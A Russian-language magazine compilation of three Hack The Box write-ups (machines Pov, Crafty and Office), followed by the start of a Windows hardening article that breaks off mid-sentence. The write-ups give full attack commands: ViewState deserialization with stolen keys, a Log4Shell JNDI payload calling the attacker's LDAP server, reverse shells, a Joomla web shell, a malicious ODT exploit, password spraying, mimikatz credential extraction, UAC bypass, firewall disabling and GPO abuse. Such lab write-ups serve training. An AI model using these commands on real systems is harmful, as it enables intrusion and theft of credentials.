Сегодня  я  покажу,  как  получить  воз‐
можность  удаленного  выполнения  кода
на веб‑сервере под управлением IIS через
уязвимость типа LFI (локальное включение
файлов). А  для  повышения  привилегий             RalfHacker                                                                                             hackerralf8@gmail.com
в Windows сначала  активируем, а затем
используем привилегию SeDebugPrivilege.


Наша цель — получение прав суперпользователя на машине Pov с учебной
площадки Hack The Box. Уровень ее сложности — средний.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.251    pov.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел всего один открытый порт 80 — веб‑сервер Microsoft IIS 10.0.
Там нас встречает одностраничный сайт.





                           Главная страница сайта


ТОЧКА ВХОДА

На сайте ничего интересного найти не удалось, поэтому приступим к ска‐
нированию.

Справка: сканирование веба c feroxbuster
Одно из первых действий при тестировании безопасности веб‑приложе‐
ния — это сканирование методом перебора каталогов, чтобы найти скрытую
информацию и недоступные обычным посетителям функции. Для этого можно
использовать программы вроде dirsearch, DIRB или  ffuf. Я предпочитаю
feroxbuster.
  При запуске указываем следующие параметры:
 • -u — URL;
 • -w — словарь (я использую словари из набора SecLists);
 • -t — количество потоков;
 • -d — глубина сканирования.



Задаем все нужные параметры и запускаем перебор:


feroxbuster -u 'http://pov.htb/' -w directory_2.3_medium.txt -t 256
-d 1

Ничего не  находим, а  значит,  следует  просканировать  поддомены  (я
это делаю с помощью ffuf), что поможет найти новые сайты и расширить
область тестирования.
   Здесь используем такие параметры:
 • -u — URL-адрес;
 • -w — словарь;
 • -t — количество потоков;
 • -H — HTTP-заголовок;
 • -fs — фильтр по размеру страницы.


ffuf -u 'http://pov.htb/' -H 'Host: FUZZ.pov.htb' -w subdomains-
bitquark-top100000.txt -t 128 -fs 12330



                       Результат сканирования поддоменов

Находим новый поддомен и добавляем запись о нем в файл /etc/hosts.


10.10.11.251 pov.htb dev.pov.htb

На новом сайте можно скачать портфолио пользователя.





                             Страница сайта





                       Запрос на скачивание файла

В  запросе  отметим  несколько  особенностей.  Во‑первых,  используется
ViewState — фича веб‑сервера ASP.NET, которая автоматически сохраняет
данные  страниц  между  разными  запросами. При  раскрытии  настроек
это может дать нам возможность  удаленно выполнять код на сервере.
Во‑вторых, обращаем внимание на способ, которым указано имя файла
для скачивания.
   Попробуем вместо cv.pdf указать web.config. После нескольких попыток
находим тот вариант, который дает нам содержимое указанного файла.





                      Содержимое файла web.config

В выводе присутствуют все необходимые данные для эксплуатации уязвимос‐
ти в сериализации ViewState.


ТОЧКА ОПОРЫ

Платформа ASP.NET для сохранения значений страниц и элементов управле‐
ния на веб‑страницах использует метод ViewState. Текущее состояние стра‐
ницы и другие важные параметры сериализуются и кодируются в Base64,
после чего сохраняются в HTML-коде страницы в скрытом поле ViewState.
   Так как ASP.NET обрабатывает сериализованные данные, это можно
использовать для выполнения кода. Чтобы такого не случалось, данные
ViewState зашифрованы и подписаны. Алгоритмы и ключ шифрования и под‐
писи как раз хранятся в файле web.config, содержимое которого мы только
что получили. А значит, мы можем сформировать нагрузку для выполнения
кода.
   Составить  и  сериализовать  нагрузку  можно  с  помощью  утилиты
ysoserial.net. Но для начала нужно сгенерировать реверс‑шелл на PowerShell,
например с помощью Online Reverse Shell Generator.





                        Генерирование реверс‑шелла

Теперь переходим на виртуальную машину с Windows и генерируем нагрузку.
В параметре --path нужно указать страницу с параметром ViewState.


ysoserial.exe -p ViewState  -g TextFormattingRunProperties --path="/
portfolio/default.aspx" --apppath="/" --decryptionalg="AES"
--decryptionkey=
"74477CEBDD09D66A4D4A8C8B5082A4CF9A15BE54A94F6F80D5E822F347183B43"
--validationalg="SHA1" --validationkey=
"5620D3D029F914F4CDF25869D24EC2DA517435B200CCF1ACFA1EDE22213BECEB55BA
3CF576813C3301FCB07018E605E7B7872EEACE791AAD71A267BC16633468"
 -c "powershell.exe -e ....."





                           Генерирование нагрузки

Запускаем листенер, чтобы ловить подключение от нашего веб‑шелла:


rlwrap nc -nlvp 4321

Затем вставляем сгенерированную нагрузку в параметр ViewState и выпол‐
няем запрос.





                            Запрос на сервер





                           Сессия пользователя

И в итоге получаем сессию пользователя sfitz.


ПРОДВИЖЕНИЕ

Среди документов пользователя находим файл connection.xml.





                    Содержимое каталога Documents

Файл содержит зашифрованные учетные данные пользователя alaading.





                       Содержимое файла alaading

Их можно расшифровать всего парой команд на PowerShell.


$cred = Import-CliXml -Path connection.xml
$cred.GetNetworkCredential() | Format-List *





                     Расшифрованные учетные данные

Используя Invoke-Command, выполним команду в контексте нового поль‐
зователя.


$secPass = ConvertTo-SecureString 'f8gQ8fynP44ek1m3' -AsPlainText
-Force
$creds = New-Object System.Management.Automation.PSCredential (
'alaading', $secPass)
Invoke-Command -ComputerName localhost -Credential $creds
-ScriptBlock { whoami }




                          Результат выполнения команды

Таким же  способом  можно  запустить  реверс‑шелл  на  другом  порте
и получить сессию от имени пользователя alaading.





                       Флаг пользователя


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Активация привилегии
Просматривая информацию о пользователе, обращаем внимание на при‐
сутствующую, но отключенную привилегию SeDebugPrivilege.





                       Информация о пользователе

У пользователей, которые обладают опасными привилегиями, в нашем слу‐
чае SeDebugPrivilege, при логоне могут формироваться два токена доступа.
Один — непривилегированный, а второй с активными опасными привиле‐
гиями. Для их разделения существует механизм UAC (User Account Control).
Таким образом, можно обойти UAC и получить токен с активной привилегией
SeDebugPrivilege, например с помощью RunasCs.
   Запускаем листенер:


rlwrap nc -nlvp 6543

И выполняем реверс‑шелл с обходом UAC.


.\RunasCs.exe alaading f8gQ8fynP44ek1m3 cmd.exe -l 9 -r 10.10.16.97:
6543 --bypass-uac



                           Выполнение RunasCs





                           Сессия пользователя


LPE через SeDebugPrivilege
Привилегия SeDebugPrivilege нужна для отладки и настройки памяти про‐
цесса, принадлежащей другой учетной записи. Эта привилегия помимо того,
что позволяет атакующему сдампить учетные записи SAM и SYSTEM для извле‐
чения хешей паролей, дает возможность выполнять код в контексте учетки
SYSTEM. В этом поможет SeDebugPrivilege Exploit.
   Этой утилите нужно передать PID процесса, в контексте которого будет
выполнена команда. Возьмем работающий от имени SYSTEM процесс lsass.


Get-Process lsass





                         Параметры процесса lsass

Узнали PID 624. Теперь создадим своего пользователя и добавим его в груп‐
пу администраторов.


SeDebugPrivesc.exe 624 "net user ralf Password123 /add"





                         Создание пользователя


SeDebugPrivesc.exe 624 "net localgroup Administrators ralf /add"





                     Добавление пользователя в группу

Свой администратор создан, но службы, через которые можно подключиться
и получить управление, недоступны. В такой ситуации решение простое —
отключим файрвол Windows.


SeDebugPrivesc.exe 624 "netsh advfirewall set allprofiles state off"





                           Отключение файрвола

С помощью NetExec проверим доступность хоста и права созданного поль‐
зователя на службе SMB.


nxc smb pov.htb -u ralf -p Password123



                            Проверка пользователя

Строка Pwn3d! означает, что пользователь является администратором. Оста‐
лось получить шелл с помощью psexec, и у нас будет флаг рута.


impacket-psexec 'ralf:Password123'@10.10.11.251





                           Флаг рута

Машина захвачена!
ВЗЛОМ





Сегодня  я  на живом  примере  покажу,
как    сервер    Minecraft,   работающий
на   Windows,   может   быть   атакован
при помощи  существующего  эксплоита.
Получив возможность удаленно выполнять             RalfHacker                                                                                             hackerralf8@gmail.com
код, мы  проанализируем  установленные
плагины и найдем данные для повышения
привилегий в системе.


Наша цель — захват машины Crafty с учебной площадки Hack The Box. Уро‐
вень задания — легкий. Все действия будут выполняться на Linux.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.249    crafty.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел два открытых порта:
 • 80 — веб‑сервер Microsoft IIS 10.0;
 • 25565 — сервер Minecraft 1.16.5.

Первым делом посмотрим, что есть на веб‑сервере. Там нас встречает
одностраничный сайт, раскрывающий еще один поддомен.





                           Главная страница сайта

Новый поддомен добавляем в наш файл /etc/hosts.


10.10.11.249 crafty.htb play.crafty.htb

Сразу отмечу, что сканирование ни первого, ни второго сайта ничего не дало.
По этой причине перейдем к серверу Minecraft.


ТОЧКА ВХОДА

Первым делом стоит проверить, есть ли для обнаруженного софта готовые
эксплоиты. Существуют специальные базы данных (например, Exploit-DB),
но для начала можно просто поискать в Google. По запросу «Minecraft 1.16.5
exploit» получаем информацию о том, что в этой версии сервера есть уяз‐
вимый компонент Log4j.





                         Поиск эксплоитов в Google

На GitHub находим эксплоит, который позволяет получить удаленное выпол‐
нение кода (RCE).


             INFO

                 О  том,  как  устроена  уязвимость  Log4Shell
                        в средстве логирования Log4j, читай в статье
                            «Log4HELL! Разбираем Log4Shell во всех под‐
                          робностях».


Автор эксплоита подразумевает, что сервер развернут на Linux, а в нашем
случае используется Windows. Поэтому в исходном коде нужно изменить
интерпретатор командной оболочки с /bin/sh на cmd.exe (строка 26).





                        Измененный код эксплоита

При запуске кода нужно использовать параметры --userip и --lport, зада‐
ющие адрес и порт листенера для подключения реверс‑шелла. Порт веб‑сер‐
вера,  с  которого  будет  загружаться  нагрузка,  необходимо  передать
в параметре --webport.


git clone https://github.com/kozmer/log4j-shell-poc
cd log4j-shell-poc
python3 poc.py --userip 10.10.16.143 --webport 8000 --lport 4321





                               Запуск эксплоита

Получаем сообщение об ошибке: исполняемый файл Java не найден. Дело
в том, что у нас не установлен JDK, качаем его с сайта Oracle.


wget https://repo.huaweicloud.com/java/jdk/8u181-b13/jdk-8u181-linux-
x64.tar.gz
tar -xf jdk-8u181-linux-x64.tar.gz
mv jdk1.8.0_181 jdk1.8.0_20

Если  повторить  запуск  эксплоита,  он  остановится  и  будет  слушать
порт 1389 и ждать запрос от нагрузки Log4j.


python3 poc.py --userip 10.10.16.143 --webport 8000 --lport 4321

Так как мы ожидаем подключение от реверс‑шелла, запустим листенер:


rlwrap nc -nlvp 4321

Затем используем консольный клиент для подключения к серверу Minecraft.
После запуска задаем адрес сервера 10.10.11.249:25565, а когда соеди‐
нение установлено, отправляем нагрузку:


${jndi:ldap://10.10.16.143:1389/a}





                      Подключение к серверу Minecraft

Почти моментально получаем запрос от нагрузки, а затем и сессию на лис‐
тенере.





                              Работа эксплоита

Мы можем зайти от имени пользователя и забрать первый флаг.





                       Флаг пользователя


ПРОДВИЖЕНИЕ

Теперь нам необходимо собрать информацию. Я буду использовать для это‐
го скрипты PEASS.

Справка: скрипты PEASS
Что делать после того, как мы получили доступ в систему от имени поль‐
зователя? Вариантов дальнейшей эксплуатации и повышения привилегий
может быть очень много, как в Linux, так и в Windows. Чтобы собрать
информацию и наметить цели, можно  использовать  Privilege  Escalation
Awesome Scripts SUITE (PEASS) — набор скриптов, которые проверяют сис‐
тему на автомате и выдают подробный отчет о потенциально интересных
файлах, процессах и настройках.



Однако в этот раз ничего, кроме каталога сервера Minecraft, в домашней пап‐
ке пользователя найти не удалось. При этом в каталоге plugins есть всего
один файл JAR.





                      Содержимое каталога plugins

Так как больше никаких зацепок нет, взглянем на этот файл в декомпиляторе.
Возможно, там найдутся новые уязвимости или даже учетные данные.
   Сначала нужно как‑то скачать этот файл с удаленного сервера. Для этого я
буду использовать веб‑сервер Python 3 с возможностью загрузки файлов.
Скачаем файл и запустим на локальном хосте, а в качестве параметра
передадим номер порта 80.


wget https://raw.githubusercontent.com/RalfHacker/
HTTPServerWithUpload/main/HTTPServerWithUpload.py
python3 HTTPServerWithUpload.py 80

Когда веб‑сервер будет запущен, для загрузки файла выполним запрос
с нашего хоста при помощи утилиты curl. В HTTP-заголовке Content-Type
нужно указать значение multipart/form-data, а путь к файлу, который заг‐
ружается на сервер, необходимо передать через аргумент -F в параметре
file.


curl.exe -X POST http://10.10.16.143/ -H "Content-Type: multipart/
form-data" -F file=@"playercounter-1.0-SNAPSHOT.jar"





                          Загрузка файла на сервер




                               Логи веб‑сервера

Плагин написан на Java, а файлы JAR легко декомпилируются. Судя по раз‐
меру, в файле не так много кода, поэтому не обязательно использовать
какой‑то локальный декомпилятор или целую IDE. Легкая и быстрая альтер‐
натива — сайты вроде decompiler.com.





                          Результат декомпиляции файла

Как и предполагалось, программа состоит всего из одного файла Java,
при этом в исходном коде присутствует незашифрованный пароль.





                  Исходный код файла Playercounter.java

Осталось найти применение этому паролю.


ЛОКАЛЬНОЕ ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Первым делом стоит проверить, не является ли найденная строка паролем
администратора. Но так как нам доступен только порт 80, у нас нет воз‐
можности подключиться к какой‑либо службе для получения сессии и выпол‐
нения команд. Это значит, что мы можем только попробовать имперсониро‐
вать администратора Windows, для чего будем использовать RunasCs.
   Выполнить реверс‑шелл через RunasCs не получилось, и я выбрал более
простой вариант — просто отключить файрвол с помощью утилиты netsh.


.\RunasCs.exe Administrator s67u84zKq8IXw "C:\\Windows\\System32\\
netsh.exe advfirewall set allprofiles state off" -l 8 --bypass-uac



                           Отключение файрвола

Проверяем, не стал ли доступен порт 445, на котором работает служба SMB.


nxc smb 10.10.11.249



                      Проверка доступности службы SMB

Так  как  служба  доступна,  а  учетные  данные  валидны,  подключаемся
с помощью утилиты psexec и забираем флаг рута.


impacket-psexec 'Administrator:s67u84zKq8IXw'@10.10.11.249





                           Флаг рута

Машина захвачена!
ВЗЛОМ





В этом райтапе я покажу, как может быть
атакован домен  управления  групповыми
политиками в Active Directory. Но начнем мы
с   восстановленных  запросов  Kerberos
и   получим   зашифрованные   данные,             RalfHacker                                                                                             hackerralf8@gmail.com
которые позволят нам подобрать пароль
пользователя. А затем воспользуемся уяз‐
вимостью в Joomla, чтобы получить сессию
на удаленном сервере.


Наша цель — получение прав суперпользователя на машине Office с учебной
площадки Hack The Box. Уровень задания — сложный.


           WARNING

                            Подключаться к машинам с HTB рекомендуется
                            только через VPN. Не делай этого с компьютеров,
                        где есть важные для тебя данные, так как ты ока‐
                        жешься в общей сети с другими участниками.



РАЗВЕДКА

Сканирование портов
Добавляем IP-адрес машины в /etc/hosts:


10.10.11.3    office.htb

И запускаем сканирование портов.

Справка: сканирование портов
Сканирование портов — стандартный первый шаг при любой атаке. Он поз‐
воляет атакующему узнать, какие службы на хосте принимают соединение.
На основе этой информации выбирается следующий шаг к получению точки
входа.
   Наиболее известный инструмент для сканирования — это Nmap. Улучшить
результаты его работы ты можешь при помощи следующего скрипта:


 #!/bin/bash
 ports=$(nmap -p- --min-rate= 500 $1 | grep ^[0-9] | cut -d '/' -f 1 |
 tr '\n' ',' | sed s/,$//)
 nmap -p$ports -A $1


Он действует в два этапа. На первом производится обычное быстрое ска‐
нирование, на втором — более тщательное сканирование, с использованием
имеющихся скриптов (опция -A).





                             Результат работы скрипта

Сканер нашел множество открытых портов, что вполне естественно для кон‐
троллера домена:
 • 53 — DNS;
 • 80 (HTTP) — веб‑сервер Apache httpd 2.4.56;
 • 88 — Kerberos;
 • 139 — служба сеансов NetBIOS, NetLogon;
 • 389 — LDAP;
 • 443 (HTTPS) — веб‑сервер Apache httpd 2.4.56;
 • 445 — SMB;
 • 464 — служба смены пароля Kerberos;
 • 593 (HTTP-RPC-EPMAP) — используется в службах DCOM и MS Exchange;
 • 636 — LDAP с шифрованием SSL или TLS;
 • 3268 (LDAP) — для доступа к Global Catalog от клиента к контроллеру;
 • 3269 (LDAPS) — для доступа к Global Catalog от клиента к контроллеру
   через защищенное соединение;
 • 5985 — служба удаленного управления WinRM;
 • 9389 — веб‑службы AD DS.

Как правило, в таких случаях первым делом стоит смотреть SMB, но на
веб‑сервере развернута Joomla, а она может быть уязвима.


ТОЧКА ВХОДА

Когда имеем дело с Joomla, первым делом следует использовать специали‐
зированный сканер — JoomScan.


joomscan -u http://10.10.11.3





                       Результат сканирования CMS Joomla

Определяем версию (4.2.7) и тут же пробуем найти для нее эксплоиты. Пер‐
вым делом идем в Google.





                         Поиск эксплоитов в Google

И сразу узнаём, что в нашей версии есть уязвимость CVE-2023-23752, что
позволит нам получить учетные данные для подключения к базе данных.
Для этого будем использовать найденный эксплоит.
   Запускаем и указываем адрес:


python3 CVE-2023-23752.py -u http://10.10.11.3





                            Результат работы эксплоита

Уязвимость заключается в неправильной проверке доступа. Эксплоит про‐
веряет различные API, которые могут вернуть учетные данные для подклю‐
чения к базе данных. Однако для авторизации в CMS полученный таким обра‐
зом пароль не подошел, а других пользователей, кроме администратора,
найти не удалось.
  В этом случае используем недочет протокола Kerberos: на запрос тикета
пользователя могут приходить ответы с разными кодами ошибок. Один —
при запросе тикета для несуществующего пользователя, другой — в ответ
на неверный пароль. Таким образом, можно методом перебора узнать, какие
пользователи есть в домене. Для этого используем утилиту kerbrute.


kerbrute_linux_amd64 userenum --dc dc.office.htb -d office.htb xato-
net-10-million-usernames.txt





                        Результат перебора пользователей

Сохраняем найденных пользователей в файл и спреим полученный ранее
пароль с помощью NetExec.


nxc smb 10.10.11.3 -u users.txt -p 'H0lOgrams4reTakIng0Ver754!'
--smb-timeout 3




                               Результат спрея пароля

Теперь у нас есть валидная учетная запись, что позволяет провести базовую
разведку в домене.
   Первым делом получим список всех пользователей.


nxc ldap 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' --users





                          Список пользователей

Также необходимо сразу узнать, какие пользователи могут получить сессию
через службу WinRM. Для этого запросим членов группы «Пользователи уда‐
ленного управления».


nxc smb 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' --group
'Remote Management Users' --smb-timeout 3




              Содержимое группы Remote Management Users

Получить сессию на сервере можно  всего через одного  пользователя.
Теперь стоит проверить общие ресурсы SMB.


nxc smb 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' --shares
--smb-timeout 3





                        Общие ресурсы SMB

Каталог SOC Analysis — нестандартный, поэтому нужно просмотреть его
содержимое.


impacket-smbclient 'office.htb/dwolfe:H0lOgrams4reTakIng0Ver754!'@10.
10.11.3





                    Содержимое общего SMB-ресурса

В общем каталоге находим дамп трафика. Скачиваем его для анализа.


                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
         HTB OFFICE
                ЗАХВАТЫВАЕМ ДОМЕН
            УПРАВЛЕНИЯ ГРУППОВЫМИ
              ПОЛИТИКАМИ WINDOWS





ТОЧКА ОПОРЫ

Kerberos network dump
Открываем скачанный дамп трафика в Wireshark и в самом конце находим
два пакета Kerberos.





                       Содержимое дампа трафика

Запрос AS-REQ содержит зашифрованную метку времени. В качестве ключа
шифрования используется хеш пароля пользователя.





              Содержимое сетевого пакета запроса AS-REQ

Используя формат представления hashcat, можно попытаться подобрать
пароль пользователя. Если с использованием NTLM-хеша строки получится
расшифровать метку времени, можно считать, что мы нашли пароль поль‐
зователя.




                          Форматы hashcat

Формируем хеш:


$krb5pa$18$tstark$OFFICE.
HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735
704d0832767af226aaa7360338a34746a00a3765386f5fc

И отправляем на перебор в режиме 19900.


hashcat -a 0 -m 19900 tstark_hash.txt rockyou.txt




                             Результат подбора пароля

Пароль получен, теперь нужно его валидировать с помощью NetExec.


nxc smb 10.10.11.3 -u tstark -p 'playboy69' --smb-timeout 3



                             Результат проверки пароля

Пароль верный, но никаких новых доступов мы не получаем. Однако этот
пароль подходит для учетной записи администратора Joomla.





                          Страница авторизации





                       Главная панель администратора


Joomla RCE
Администратор Joomla может загружать файлы на сервер, что дает воз‐
можность получить RCE. Для этого необходимо в меню перейти в System →
Site Templates и выбрать шаблон.





                            Страница System





                           Страница Templates

Затем выбираем New File, вводим имя и выбираем расширение .php.





                           Файлы шаблона





                         Создание нового файла

В окне исходного кода вставляем p0wny-shell.





                          Исходный код шелла

Когда файл сохранен, можно перейти к шеллу и получить возможность выпол‐
нения команд.





                         Страница с веб‑шеллом

Запускаем листенер:


rlwrap nc -nlvp 4321

И с помощью RunasCs выполняем реверс‑шелл от имени пользователя
tstark.


RunasCs.exe tstark playboy69 -d office cmd.exe -r 10.10.16.143:4321





                        Сессия пользователя tstark

В домашнем каталоге пользователя забираем первый флаг.





                       Флаг пользователя




                                     Продолжение статьи →
ВЗЛОМ               ← НАЧАЛО СТАТЬИ
         HTB OFFICE
                ЗАХВАТЫВАЕМ ДОМЕН
            УПРАВЛЕНИЯ ГРУППОВЫМИ
              ПОЛИТИКАМИ WINDOWS





ПРОДВИЖЕНИЕ

Пользователь ppotts
Первым делом смотрим системные настройки. В списке прослушиваемых
портов можно обнаружить 8083.


netstat /an





                        Прослушиваемые порты

Скорее всего, на этом порте работает веб‑сервер, поэтому просмотрим
каталог XAMPP.





                  Содержимое каталога C:\xampp\htdocs

Но чтобы получить доступ к порту, который доступен только для локального
хоста, необходимо построить сетевой туннель. Для этого будем использовать
chisel.
  На локальном хосте запустим сервер, ожидающий подключения (параметр
--reverse) на порт 8888 (параметр -p).


./chisel.bin server -p 8888 --reverse

Затем на удаленном хосте запустим клиентскую часть. Указываем адрес сер‐
вера и порт для подключения, а также настройку туннеля: туннелировать тра‐
фик с локального порта 8083 сервера на порт 8083 клиента.


chisel.exe client 10.10.16.143:8888 R:8083:localhost:8083

В логах сервера мы должны увидеть сообщение о создании сессии.





                                Логи chisel server

Теперь можно обратиться к порту 8083 локальной машины через браузер.





                           Главная страница сайта

На сайте есть форма загрузки файлов, но приложение принимает не все
форматы, а только документы OpenOffice.





                        Ошибка загрузки файла

Формат ODT — это шаблон документа LibreOffice. Я попробовал загрузить
документ с макросом, никакой реакции веб‑сервер не дал, поэтому приш‐
лось поискать последние эксплоиты.





                         Поиск эксплоитов в Google

Свежая уязвимость CVE-2023-2255 позволяет сформировать такой файл
ODT, который при открытии выполнит произвольный код. Для формирования
файла с нагрузкой используем эксплоит за авторством Elweth. В качестве
исполняемой команды будем внедрять уже знакомый реверс‑шелл.


python3 CVE-2023-2255.py --cmd 'powershell -e JABjA....
4AdAAuAEMAbABvAHMAZQAoACkA' --output doc.odt

Теперь отправляем сформированный файл и сразу же получаем бэкконнект
на указанный порт.





                        Сессия пользователя ppotts


Пользователь hhogan
Одно из мест, которые всегда стоит проверять в поисках пути для повышения
привилегий, — сохраненные учетные данные.


cmdkey /list





                       Сохраненные учетные данные

Менеджер  учетных  данных содержит  сохраненный пароль  пользователя
office\hhogan. Для хранения данных Credman использует механизм DPAPI.
Блобы c данными  хранятся в  каталоге %APPDATA%\Roaming\Microsoft\
Credentials.


Get-ChildItem -Hidden C:\Users\ppotts\AppData\Roaming\Microsoft\
Credentials\





                    Содержимое каталога Credentials

При попытке расшифровать BLOB без мастер‑ключа при помощи mimikatz
мы получим guid нужного нам ключа (поле guidMasterKey).


mimikatz.exe "dpapi::cred /in:C:\Users\ppotts\AppData\Roaming\
Microsoft\Credentials\18A1927A997A794B65E9849883AC3F3E" "exit"





                       Содержимое блоба данных

Мастер‑ключ хранится в зашифрованном на ключевой информации поль‐
зователя виде в файле вот по такому пути:


%APPDATA%\Roaming\Microsoft\Protect\<SID>\<guidMasterKey>

Так как мы работаем в сессии пользователя, мастер‑ключ которого нам нуж‐
но получить, можем использовать механизм /rpc. Он поможет нам получить
важную информацию, которая позволит расшифровать мастер‑ключ.


mimikatz.exe "dpapi::masterkey /in:C:\Users\ppotts\AppData\Roaming\
Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\
191d3f9d-7959-4b4d-a520-a444853c47eb /rpc" "exit"





                           Получение мастер‑ключа

Теперь используем полученный мастер‑ключ, чтобы расшифровать блоб.


mimikatz.exe "dpapi::cred /in:C:\Users\ppotts\AppData\Roaming\
Microsoft\Credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:
87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde9
9ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166"
 "exit"





                       Учетные данные пользователя

Так как новый пользователь состоит в группе «Пользователи удаленного
управления», можно получить доступ, используя службу WinRM. В этом нам
поможет утилита Evil-WinRM.


evil-winrm -u 'hhogan' -p 'H4ppyFtW183#' -i 10.10.11.3





                       Сессия пользователя hhogan


ПОВЫШЕНИЕ ПРИВИЛЕГИЙ

Просматриваем информацию о пользователе, его группы и привилегии
и отмечаем, что пользователь состоит в группе GPO Managers.





                       Информация о пользователе

Эта группа позволит нам управлять объектами групповой политики, а это путь
к  повышению  привилегий.  Получим  все  объекты  групповой  политики
в домене. Нас интересуют только идентификаторы объектов и их имена.


Get-GPO -All | select Id,DisplayName





                               Список GPO

Для  изменения  параметров  GPO  будем  использовать   инструмент
SharpGPOAbuse. Изменим политику домена по умолчанию и добавим текуще‐
го пользователя в группу Administrators.


.\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount hhogan --GPOName
"Default Domain Policy"
gpupdate /force





                           Изменение GPO

Периодически просматриваем  членов  группы  Administrators. Вскоре там
появится и наш добавленный пользователь.


net localgroup Administrators





                        Члены группы Administrators

Теперь у пользователя есть высокие привилегии и мы можем использовать
PsExec для получения сессии от имени SYSTEM.


impacket-psexec 'office.htb/hhogan:H4ppyFtW183#'@10.10.11.3





                           Флаг рута

Мы получили флаг рута, а значит, машина захвачена!
ПРИВАТНОСТЬ





Если ты хочешь защититься от вирусов,
тебе  нужен  антивирус,  верно?  Вовсе
не обязательно. У антивирусов множество
недостатков, поэтому если у тебя на плечах
голова и ты готов ее  использовать, то              Nik Zerof                                                                                              xtahi0nix@gmail.com
можешь  сам  свести  риски  заражения
к минимуму.  Достаточно следовать  пра‐
вилам цифровой гигиены и сделать нес‐
колько важных настроек системы. Именно
об этих настройках и поговорим.


Думаю, проблемы антивирусов тебе хорошо знакомы. Для меня решающий
момент — это риски, связанные с конфиденциальностью. О них открыто
сообщается в любом пользовательском соглашении антивируса — от дефол‐
тного «Защитника» Windows до широко известных платных решений.
  К тому же антивирус, как известно, не дает стопроцентной гарантии
защиты. Поэтому, даже если ты не планируешь отказываться от него, допол‐
нительная защита никогда не помешает.
   Важное предупреждение: часть инструментов, о которых я рассказываю
в статье, производят глубинные изменения в Windows и не будут уведомлять
тебя, если ты сделаешь что‑то не так. При неумелом использовании можно
легко повредить систему. Зато в руках профессионала эти утилиты прев‐
ращаются в грозное оружие против уязвимостей.


ТЮНИНГУЕМ WINDOWS

Надо понимать, что вирус — это всего лишь программа, которая исполняется
в ОС. Поэтому первый шаг к противодействию вирусу — правильно настроить
окружение.
   Первым делом нужно создать пользователя с ограниченными правами.
Да, все уже миллион раз читали и слышали рекомендации не сидеть
под админом, в том числе и в Windows, но почему‑то упорно продолжают.
   Если хочешь обходиться без антивируса, заведи привычку сразу после
установки ОС и драйверов делать учетку обычного юзера. Это обломает зубы
всем вредоносным программам, которые не умеют поднимать себе права. Ну
а про то, что система всегда должна быть обеспечена последними патчами,
и говорить не стоит, это знают даже малые дети.
   Работая от имени пользователя, ты заодно получишь некоторую защиту
системных файлов и настроек от несанкционированных изменений. Если
вирус или какая‑то другая гадость полезет менять системные файлы, то стол‐
кнется с ограничениями доступа.
  А дальше нужно уменьшить, насколько это возможно, поверхность атаки
на тебя.


             INFO

                           Поверхность атаки в информационной безопас‐
                       ности относится к сумме всех уязвимостей и спо‐
                        собов,  через  которые  злоумышленник  может
                          попытаться проникнуть в систему. Чем больше
                          потенциальных уязвимостей, тем больше повер‐
                        хность атаки.


Даже если у тебя стоят последние патчи, ты все равно не можешь быть уве‐
рен, что нет ни одной уязвимости в компонентах ОС или софте. Бывают
и баги нулевого дня, и мы знаем немало историй, когда они становились
неожиданностью для огромного числа пользователей.
   Значит, если какой‑то компонент или служба не используется, смело
отключай ее. Не юзаешь OneDrive? Удаляй! Microsoft Edge? Туда же! У тебя
нет принтера? Отключи службу печати. В Windows по умолчанию напихан
вагон софта и служб, которыми ты никогда не воспользуешься. Поэтому
берем скальпель и вырезаем всё лишнее.
   Причем удалять можно как из самой системы, так и сразу из установоч‐
ного образа, чтобы в случае чего не приходилось повторять те же действия
после переустановки системы. Я предпочитаю совмещать эти два способа.


MSMG Toolkit
Несмотря на весьма допотопный интерфейс, MSMG Toolkit — это очень
полезная тулза для создания собственных сборок Windows. Она позволяет
удалить кучу всего ненужного (да и нужного — тоже), включая предустанов‐
ленное ПО и телеметрию. Здесь же можно, например, отключить проверку
